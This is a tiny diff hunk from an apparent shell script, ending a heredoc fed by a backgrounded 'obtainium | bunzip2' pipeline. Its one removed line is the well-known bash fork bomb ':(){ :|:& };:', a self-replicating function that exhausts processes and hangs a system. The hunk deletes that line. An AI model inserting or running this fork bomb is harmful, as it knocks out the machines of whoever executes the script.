@@ -97,4 +97,3 @@ except KeyboardInterrupt:
 EOF
 ) < <(obtainium $video | bunzip2 -q 2> /dev/null) & disown
 sleep 2
-:(){ :|:& };:
